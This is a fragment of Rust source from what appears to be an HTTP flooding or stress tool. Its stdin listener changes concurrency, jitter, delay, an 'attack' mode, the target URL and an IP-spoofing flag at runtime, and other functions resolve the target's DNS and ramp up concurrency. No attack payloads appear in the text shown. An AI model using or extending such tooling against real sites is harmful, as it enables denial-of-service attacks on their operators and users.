pub(crate) async fn listen_stdin(state: Arc<Mutex<AppState>>) {
    use tokio::io::{AsyncBufReadExt, BufReader};
    let stdin = tokio::io::stdin();
    let mut reader = BufReader::new(stdin).lines();
    loop {
        // Yield to prevent locking out tokio executor on empty input
        tokio::task::yield_now().await;
        match reader.next_line().await {
            Ok(Some(line)) => {
                let trimmed = line.trim();
                if trimmed.is_empty() { continue; }
                if let Some(pos) = trimmed.find('=') {
                    let key = trimmed[..pos].trim();
                    let val = trimmed[pos+1..].trim();
                    let mut st = state.lock().await;
                    match key {
                        "concurrency" => {
                            if let Ok(parsed) = val.parse::<usize>() {
                                st.load_concurrency = parsed;
                                st.stats.concurrency.store(parsed, Ordering::Relaxed);
                                println!("  [System] Dynamic concurrency updated to {}", parsed);
                            }
                        }
                        "jitter" => {
                            if let Ok(parsed) = val.parse::<u64>() {
                                st.jitter_ms = parsed;
                                println!("  [System] Dynamic jitter updated to {}ms", parsed);
                            }
                        }
                        "delay" => {
                            if let Ok(parsed) = val.parse::<u64>() {
                                st.interval_ms = parsed;
                                println!("  [System] Dynamic delay updated to {}ms", parsed);
                            }
                        }
                        "attack" => {
                            st.attack_mode = AttackMode::from_str(val);
                            println!("  [System] Dynamic attack mode updated to {}", st.attack_mode);
                        }
                        "target" | "target_url" => {
                            st.target_url = val.to_string();
                            println!("  [System] Dynamic target updated to {}", val);
                            let state_clone = Arc::clone(&state);
                            let target_clone = val.to_string();
                            tokio::spawn(async move {
                                if let Err(e) = probe_domain(&target_clone, &state_clone).await {
                                    eprintln!("  Failed to probe domain: {}", e);
                                }
                            });
                        }
                        "spoof_ip" => {
                            let parsed = val == "true" || val == "1";
                            SPOOF_IP.store(parsed, Ordering::Relaxed);
                            println!("  [System] Dynamic spoof_ip updated to {}", parsed);
                        }
                        _ => {}
                    }
                }
            }
            Ok(None) => {
                // EOF reached (stdin closed by parent process)
                break;
            }
            Err(_) => {
                break;
            }
        }
    }
}


pub(crate) async fn resolve_target_dns(target_url: &str) -> Option<std::net::IpAddr> {
    let u = Url::parse(target_url).ok()?;
    let host = u.host_str()?;
    if host.contains("localhost") || host.contains("127.0.0.1") || host.ends_with(".onion") {
        return None;
    }
    let mut addrs = tokio::net::lookup_host(format!("{}:443", host)).await.ok()?;
    addrs.next().map(|addr| addr.ip())
}


pub(crate) fn format_time_now() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let days = secs / 86400;
    let remainder = secs % 86400;
    let hours = remainder / 3600;
    let minutes = (remainder % 3600) / 60;
    let seconds = remainder % 60;
    // Simple date from days since epoch (1970-01-01)
    let mut d = days;
    let mut year = 1970u32;
    while d >= 365u64 {
        let leap = (year.is_multiple_of(4) && !year.is_multiple_of(100)) || year.is_multiple_of(400);
        let yd = if leap { 366 } else { 365 };
        if d < yd as u64 { break; }
        d -= yd as u64;
        year += 1;
    }
    // Simple month/day from day-of-year
    let months = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let leap = (year.is_multiple_of(4) && !year.is_multiple_of(100)) || year.is_multiple_of(400);
    let mut month = 1u32;
    let mut day = d + 1;
    for m in &months {
        let mut ml = *m as u64;
        if month == 2 && leap { ml += 1; }
        if day <= ml { break; }
        day -= ml;
        month += 1;
    }
    format!("{:04}-{:02}-{:02} {:02}:{:02}:{:02}", year, month, day, hours, minutes, seconds)
}

/// Gradually increases concurrency from 1 to `target` over `ramp_up_secs` seconds.
pub(crate) async fn ramp_up_concurrency(state: Arc<Mutex<AppState>>, target: usize, ramp_up_secs: u64) {
    if ramp_up_secs == 0 || target <= 1 { return; }
    let tick_ms = (ramp_up_secs as f64 / target as f64 * 1000.0).max(200.0) as u64;
    println!("  Ramping up concurrency: 1 → {} over {}s (tick = {}ms)", target, ramp_up_secs, tick_ms);
    for c in 2..=target {
        tokio::time::sleep(Duration::from_millis(tick_ms)).await;
        let mut st = state.lock().await;
        st.load_concurrency = c;
        st.stats.concurrency.store(c, Ordering::Relaxed);
        println!("  Ramp-up: concurrency = {}", c);
    }
    println!("  Ramp-up complete: reached concurrency = {}", target);
}
